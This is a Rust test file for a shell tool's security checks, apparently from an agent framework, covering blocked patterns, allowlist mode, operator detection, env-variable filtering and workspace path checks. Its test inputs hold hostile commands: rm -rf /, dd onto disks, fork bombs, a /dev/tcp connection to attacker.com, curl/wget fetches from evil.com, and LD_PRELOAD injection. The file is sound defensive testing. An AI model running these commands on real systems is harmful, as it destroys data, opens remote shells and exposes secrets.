use camino::Utf8PathBuf;
use serde_json::json;

use kkr_core::tool::{Tool, ToolContext};
use kkr_tool_shell::{SafeShellTool, ShellTool};

// ---------------------------------------------------------------------------
// Helper to build a ToolContext rooted at a given workspace directory.
// ---------------------------------------------------------------------------
fn ctx_with_workspace(root: &str) -> ToolContext {
    ToolContext::new().with_workspace(Utf8PathBuf::from(root))
}

fn default_ctx() -> ToolContext {
    ToolContext::new()
}

/// Assert that execute returns a Security error.
async fn assert_security_error(tool: &dyn Tool, params: serde_json::Value, ctx: &ToolContext) {
    let result = tool.execute(params, ctx).await;
    match result {
        Err(kkr_core::Error::Security(_)) => {} // expected
        other => panic!("Expected Security error, got: {:?}", other),
    }
}

/// Assert that execute returns a PathTraversal error.
async fn assert_path_traversal_error(
    tool: &dyn Tool,
    params: serde_json::Value,
    ctx: &ToolContext,
) {
    let result = tool.execute(params, ctx).await;
    match result {
        Err(kkr_core::Error::PathTraversal { .. }) => {} // expected
        other => panic!("Expected PathTraversal error, got: {:?}", other),
    }
}

/// Assert that execute returns a Validation error.
async fn assert_validation_error(
    tool: &dyn Tool,
    params: serde_json::Value,
    ctx: &ToolContext,
) {
    let result = tool.execute(params, ctx).await;
    match result {
        Err(kkr_core::Error::Validation { .. }) => {} // expected
        other => panic!("Expected Validation error, got: {:?}", other),
    }
}

/// Assert that execute succeeds (returns Ok).
async fn assert_ok(tool: &dyn Tool, params: serde_json::Value, ctx: &ToolContext) {
    let result = tool.execute(params, ctx).await;
    assert!(result.is_ok(), "Expected Ok, got: {:?}", result);
}

// ===========================================================================
// 1. normalize_command — tested indirectly via is_command_allowed / execute
//
//    normalize_command collapses whitespace and trims.  We verify by showing
//    that a blocked pattern matches even when the raw command has extra
//    whitespace/tabs.
// ===========================================================================
mod normalize_command_tests {
    use super::*;

    #[tokio::test]
    async fn blocked_pattern_matches_with_extra_internal_whitespace() {
        // "rm -rf /" is blocked. Supply it with multiple spaces/tabs.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "rm  -rf  /"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn blocked_pattern_matches_with_leading_trailing_whitespace() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "   rm -rf /   "}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn blocked_pattern_matches_with_tabs() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "\trm\t-rf\t/\t"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn blocked_pattern_matches_with_mixed_whitespace() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        // Mixed tabs, spaces, newlines — normalize should collapse to single spaces.
        assert_security_error(
            &tool,
            json!({"command": "  rm   \t -rf \t  /  "}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn normal_command_with_extra_whitespace_succeeds() {
        // "echo hello" with extra spaces should still be allowed and succeed.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_ok(&tool, json!({"command": "  echo   hello  "}), &ctx).await;
    }
}

// ===========================================================================
// 2. extract_base_command — tested indirectly via allowlist mode
//
//    extract_base_command strips path prefixes (/usr/bin/ls -> ls) and
//    splits on operators.
// ===========================================================================
mod extract_base_command_tests {
    use super::*;

    #[tokio::test]
    async fn full_path_is_stripped_to_base_command() {
        // SafeShellTool allows "ls". Passing /usr/bin/ls should still match.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(&tool, json!({"command": "/usr/bin/ls"}), &ctx).await;
    }

    #[tokio::test]
    async fn deeply_nested_path_is_stripped() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "/a/b/c/d/e/echo hello"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn relative_path_is_stripped() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        // ./ls -> ls
        assert_ok(&tool, json!({"command": "./ls"}), &ctx).await;
    }

    #[tokio::test]
    async fn disallowed_command_with_path_rejected() {
        // "python" is not in SafeShellTool allowlist.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "/usr/bin/python -c 'import os'"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn operator_in_command_uses_first_segment_for_base() {
        // extract_base_command splits on operators; the first segment is checked.
        // "ls | rm" — the base command is "ls" which is in the allowlist, but
        // the pipe operator should be caught by has_unquoted_shell_operators.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "ls | rm -rf /"}),
            &ctx,
        )
        .await;
    }
}

// ===========================================================================
// 3. has_unquoted_shell_operators — tested indirectly via allowlist mode
//
//    Operators |, ;, &, `, $() outside quotes are flagged.
//    Operators inside quotes are NOT flagged (but only matters in allowlist
//    mode since unrestricted ShellTool does not check operators).
// ===========================================================================
mod unquoted_operator_tests {
    use super::*;

    #[tokio::test]
    async fn pipe_outside_quotes_blocked_in_allowlist() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "ls -la | grep foo"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn semicolon_outside_quotes_blocked_in_allowlist() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo hi ; rm -rf /"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn ampersand_outside_quotes_blocked_in_allowlist() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo hi & echo bye"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn double_ampersand_blocked_in_allowlist() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo hi && echo bye"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn backtick_substitution_blocked_in_allowlist() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo `whoami`"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn dollar_paren_substitution_blocked_in_allowlist() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo $(whoami)"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn pipe_inside_single_quotes_allowed() {
        // Operators inside single quotes should NOT be flagged.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "echo 'a|b;c&d'"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn pipe_inside_double_quotes_allowed() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "echo \"a|b;c&d\""}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn backtick_inside_single_quotes_allowed() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "echo '`whoami`'"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn dollar_paren_inside_double_quotes_not_flagged() {
        // $( inside double quotes: the detection is purely textual.
        // In the implementation, the quote-tracking prevents operator detection.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "echo \"$(date)\""}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn semicolon_inside_double_quotes_allowed() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "echo \"hello ; world\""}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn redirect_with_ampersand_not_flagged() {
        // >& is NOT blocked because the code checks `c == '&' && prev != '>'`.
        // "echo foo >& /dev/null" — the & after > is not flagged.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "echo foo >& /dev/null"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn escaped_pipe_handling() {
        // Backslash-escaped operators: the code checks `prev != '\\'`.
        // `echo hello \| world` — the pipe is preceded by \ so should not be flagged.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "echo hello \\| world"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn escaped_semicolon_handling() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "echo hello \\; world"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn operators_not_checked_in_unrestricted_mode() {
        // Without an allowlist, ShellTool does NOT check for operators.
        // So pipes, semicolons, etc., are allowed.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "echo hi | cat"}),
            &ctx,
        )
        .await;
    }
}

// ===========================================================================
// 4. Blocked pattern matching — default blocked patterns
// ===========================================================================
mod blocked_patterns_tests {
    use super::*;

    #[tokio::test]
    async fn rm_rf_root_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(&tool, json!({"command": "rm -rf /"}), &ctx).await;
    }

    #[tokio::test]
    async fn rm_rf_root_wildcard_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(&tool, json!({"command": "rm -rf /*"}), &ctx).await;
    }

    #[tokio::test]
    async fn rm_rf_home_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(&tool, json!({"command": "rm -rf ~"}), &ctx).await;
    }

    #[tokio::test]
    async fn dd_dev_zero_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "dd if=/dev/zero of=/dev/sda"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn dd_dev_random_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "dd if=/dev/random of=output.bin"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn dd_dev_urandom_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "dd if=/dev/urandom of=output.bin bs=1M count=10"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn mkfs_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "mkfs.ext4 /dev/sda1"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn fork_bomb_compact_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": ":(){ :|:& };:"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn fork_bomb_no_spaces_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": ":(){:|:&};:"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn redirect_to_sda_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "cat /etc/passwd > /dev/sda"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn redirect_to_nvme_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo x > /dev/nvme"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn redirect_to_vda_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo x > /dev/vda"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn chmod_777_root_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "chmod -R 777 /"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn dev_tcp_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "exec 3<>/dev/tcp/attacker.com/4444"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn dev_udp_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "exec 3<>/dev/udp/10.0.0.1/53"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn blocked_pattern_with_normalized_whitespace() {
        // Extra whitespace around a blocked pattern should still be caught
        // after normalization collapses it.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "  dd   if=/dev/zero   of=/dev/sda  "}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn custom_blocked_pattern() {
        let tool = ShellTool::new().block_pattern("curl evil.com");
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "curl evil.com/malware.sh"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn safe_rm_not_blocked() {
        // "rm somefile.txt" should NOT match "rm -rf /" pattern.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_ok(&tool, json!({"command": "rm somefile.txt"}), &ctx).await;
    }

    #[tokio::test]
    async fn safe_dd_not_blocked() {
        // dd without the /dev/zero, /dev/random, or /dev/urandom source is fine.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({"command": "dd if=input.img of=output.img bs=4M"}),
            &ctx,
        )
        .await;
    }
}

// ===========================================================================
// 5. Allowlist mode (SafeShellTool)
// ===========================================================================
mod allowlist_tests {
    use super::*;

    #[tokio::test]
    async fn allowed_command_succeeds() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(&tool, json!({"command": "echo hello"}), &ctx).await;
    }

    #[tokio::test]
    async fn ls_allowed() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(&tool, json!({"command": "ls -la /tmp"}), &ctx).await;
    }

    #[tokio::test]
    async fn pwd_allowed() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(&tool, json!({"command": "pwd"}), &ctx).await;
    }

    #[tokio::test]
    async fn date_allowed() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(&tool, json!({"command": "date +%Y"}), &ctx).await;
    }

    #[tokio::test]
    async fn whoami_allowed() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_ok(&tool, json!({"command": "whoami"}), &ctx).await;
    }

    #[tokio::test]
    async fn disallowed_command_rejected() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "curl http://evil.com"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn python_command_rejected() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "python3 -c 'import os; os.system(\"rm -rf /\")'"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn wget_command_rejected() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "wget http://evil.com/payload"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn exact_match_not_prefix_match() {
        // "cat" is allowed, but "catapult" is a different command and should be rejected.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "catapult launch"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn exact_match_not_prefix_match_echo_variant() {
        // "echo" is allowed, but "echoer" is not.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echoer something"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn exact_match_not_suffix_match() {
        // "ls" is allowed. "als" is not, even though it ends with "ls".
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "als something"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn chaining_with_semicolon_blocked_in_allowlist() {
        // Both "ls" and "echo" are in the allowlist, but chaining is blocked.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "ls ; echo pwned"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn chaining_allowed_into_dangerous_blocked() {
        // Attempt to chain an allowed command with a dangerous one.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "ls ; rm -rf /"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn pipe_blocked_in_allowlist() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "ls | xargs rm"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn background_execution_blocked_in_allowlist() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "ls &"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn command_substitution_blocked_in_allowlist() {
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo $(cat /etc/shadow)"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn custom_allowlist_works() {
        let tool = ShellTool::new().allow_commands(vec!["cargo".to_string()]);
        let ctx = default_ctx();

        // "cargo" is allowed
        assert_ok(&tool, json!({"command": "cargo version"}), &ctx).await;

        // "make" is not allowed
        assert_security_error(&tool, json!({"command": "make all"}), &ctx).await;
    }

    #[tokio::test]
    async fn empty_allowlist_means_unrestricted() {
        // When the allowlist is empty (default ShellTool), no command is
        // rejected by the allowlist filter.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_ok(&tool, json!({"command": "python3 --version"}), &ctx).await;
    }
}

// ===========================================================================
// 6. Environment variable validation
// ===========================================================================
mod env_validation_tests {
    use super::*;

    #[tokio::test]
    async fn ld_preload_rejected_in_params() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"LD_PRELOAD": "/tmp/evil.so"}
                }),
                &ctx,
            )
            .await;
        match result {
            Err(kkr_core::Error::Security(msg)) => {
                assert!(
                    msg.contains("LD_PRELOAD"),
                    "Error should mention LD_PRELOAD: {}",
                    msg
                );
            }
            other => panic!("Expected Security error for LD_PRELOAD, got: {:?}", other),
        }
    }

    #[tokio::test]
    async fn ld_library_path_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"LD_LIBRARY_PATH": "/tmp/evil"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn dyld_insert_libraries_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn bash_env_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"BASH_ENV": "/tmp/evil.sh"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn env_var_rejected() {
        // "ENV" is in the blocked list.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"ENV": "/tmp/evil.sh"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn prompt_command_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"PROMPT_COMMAND": "curl evil.com"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn shellopts_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"SHELLOPTS": "xtrace"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn bashopts_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"BASHOPTS": "extglob"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn cdpath_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"CDPATH": "/tmp:/var"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn globignore_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"GLOBIGNORE": "*"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn bash_func_prefix_rejected() {
        // BASH_FUNC_ is checked with starts_with, so any variable beginning with it
        // should be blocked (e.g. BASH_FUNC_x%%).
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"BASH_FUNC_evil%%": "() { rm -rf /; }"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn blocked_env_case_insensitive() {
        // The code uppercases the key before comparing: key_upper == b.
        // So "ld_preload" (lowercase) should also be rejected.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"ld_preload": "/tmp/evil.so"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn blocked_env_mixed_case() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {"Ld_Preload": "/tmp/evil.so"}
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn safe_env_var_allowed() {
        // A normal env var like "MY_VAR" should not be blocked.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_ok(
            &tool,
            json!({
                "command": "echo $MY_VAR",
                "env": {"MY_VAR": "hello"}
            }),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn blocked_env_in_tool_constructor_rejected() {
        // The env() builder on ShellTool is also validated.
        let tool = ShellTool::new().env("LD_PRELOAD", "/tmp/evil.so");
        let ctx = default_ctx();
        let result = tool
            .execute(json!({"command": "echo hi"}), &ctx)
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn blocked_env_in_context_rejected() {
        // Blocked env vars in ToolContext should also be rejected.
        let tool = ShellTool::new();
        let ctx = ToolContext::new().with_env("LD_PRELOAD", "/tmp/evil.so");
        let result = tool
            .execute(json!({"command": "echo hi"}), &ctx)
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }

    #[tokio::test]
    async fn multiple_env_vars_one_blocked() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(
                json!({
                    "command": "echo hi",
                    "env": {
                        "SAFE_VAR": "ok",
                        "BASH_ENV": "/tmp/evil.sh",
                        "ANOTHER_SAFE": "fine"
                    }
                }),
                &ctx,
            )
            .await;
        assert!(matches!(result, Err(kkr_core::Error::Security(_))));
    }
}

// ===========================================================================
// 7. Working directory validation
// ===========================================================================
mod working_dir_tests {
    use super::*;

    #[tokio::test]
    async fn working_dir_inside_workspace_allowed() {
        let workspace = tempfile::tempdir().unwrap();
        let sub = workspace.path().join("subdir");
        std::fs::create_dir_all(&sub).unwrap();

        let ws_path = Utf8PathBuf::from_path_buf(workspace.path().to_path_buf())
            .expect("tempdir should be UTF-8");
        let ctx = ctx_with_workspace(ws_path.as_str());

        let tool = ShellTool::new();
        assert_ok(
            &tool,
            json!({
                "command": "echo hello",
                "working_dir": sub.display().to_string()
            }),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn working_dir_outside_workspace_rejected() {
        let workspace = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();

        let ws_path = Utf8PathBuf::from_path_buf(workspace.path().to_path_buf())
            .expect("tempdir should be UTF-8");
        let ctx = ctx_with_workspace(ws_path.as_str());

        let tool = ShellTool::new();
        assert_path_traversal_error(
            &tool,
            json!({
                "command": "echo hello",
                "working_dir": outside.path().display().to_string()
            }),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn working_dir_traversal_with_dot_dot_rejected() {
        let workspace = tempfile::tempdir().unwrap();
        let sub = workspace.path().join("subdir");
        std::fs::create_dir_all(&sub).unwrap();

        let ws_path = Utf8PathBuf::from_path_buf(workspace.path().to_path_buf())
            .expect("tempdir should be UTF-8");
        let ctx = ctx_with_workspace(ws_path.as_str());

        // Attempt to escape via ..
        let escape_path = sub.join("..").join("..").join("..");
        let tool = ShellTool::new();
        assert_path_traversal_error(
            &tool,
            json!({
                "command": "echo hello",
                "working_dir": escape_path.display().to_string()
            }),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn working_dir_is_workspace_root_allowed() {
        let workspace = tempfile::tempdir().unwrap();

        let ws_path = Utf8PathBuf::from_path_buf(workspace.path().to_path_buf())
            .expect("tempdir should be UTF-8");
        let ctx = ctx_with_workspace(ws_path.as_str());

        let tool = ShellTool::new();
        assert_ok(
            &tool,
            json!({
                "command": "echo hello",
                "working_dir": workspace.path().display().to_string()
            }),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn no_workspace_root_allows_any_directory() {
        // Without a workspace root, any working directory is accepted.
        let anywhere = tempfile::tempdir().unwrap();
        let ctx = default_ctx();

        let tool = ShellTool::new();
        assert_ok(
            &tool,
            json!({
                "command": "echo hello",
                "working_dir": anywhere.path().display().to_string()
            }),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn absolute_path_outside_workspace_rejected() {
        let workspace = tempfile::tempdir().unwrap();

        let ws_path = Utf8PathBuf::from_path_buf(workspace.path().to_path_buf())
            .expect("tempdir should be UTF-8");
        let ctx = ctx_with_workspace(ws_path.as_str());

        let tool = ShellTool::new();
        assert_path_traversal_error(
            &tool,
            json!({
                "command": "echo hello",
                "working_dir": "/etc"
            }),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn symlink_escape_rejected() {
        // Create workspace and an outside dir, then symlink inside workspace
        // pointing outside.
        let workspace = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        let link_path = workspace.path().join("escape_link");

        // Create a symlink: workspace/escape_link -> outside/
        #[cfg(unix)]
        std::os::unix::fs::symlink(outside.path(), &link_path).unwrap();

        let ws_path = Utf8PathBuf::from_path_buf(workspace.path().to_path_buf())
            .expect("tempdir should be UTF-8");
        let ctx = ctx_with_workspace(ws_path.as_str());

        let tool = ShellTool::new();
        // The canonicalize() call in validate_working_dir should resolve the
        // symlink and see it points outside workspace.
        assert_path_traversal_error(
            &tool,
            json!({
                "command": "echo hello",
                "working_dir": link_path.display().to_string()
            }),
            &ctx,
        )
        .await;
    }
}

// ===========================================================================
// 8. Edge cases and miscellaneous
// ===========================================================================
mod edge_case_tests {
    use super::*;

    #[tokio::test]
    async fn empty_command_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_validation_error(&tool, json!({"command": ""}), &ctx).await;
    }

    #[tokio::test]
    async fn whitespace_only_command_rejected() {
        // After normalization, an all-whitespace command becomes empty.
        // However, the empty check happens before normalization in execute(),
        // so "   " passes the empty check but `is_command_allowed` runs on it.
        // The result depends on implementation. Let's just verify it doesn't
        // silently succeed in a dangerous way. If it actually runs, "   " as
        // a shell command is effectively a no-op.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        // This should either error or succeed harmlessly.
        let _result = tool.execute(json!({"command": "   "}), &ctx).await;
    }

    #[tokio::test]
    async fn missing_command_field_rejected() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool.execute(json!({}), &ctx).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn successful_command_returns_stdout() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(json!({"command": "echo hello"}), &ctx)
            .await
            .expect("echo should succeed");
        let stdout = result["stdout"].as_str().unwrap();
        assert!(stdout.contains("hello"));
        assert_eq!(result["success"].as_bool(), Some(true));
        assert_eq!(result["exit_code"].as_i64(), Some(0));
    }

    #[tokio::test]
    async fn failed_command_returns_nonzero_exit() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(json!({"command": "false"}), &ctx)
            .await
            .expect("false should execute but return non-zero");
        assert_eq!(result["success"].as_bool(), Some(false));
        assert_ne!(result["exit_code"].as_i64(), Some(0));
    }

    #[tokio::test]
    async fn duration_ms_is_present() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        let result = tool
            .execute(json!({"command": "echo hi"}), &ctx)
            .await
            .unwrap();
        assert!(result["duration_ms"].is_number());
    }

    #[tokio::test]
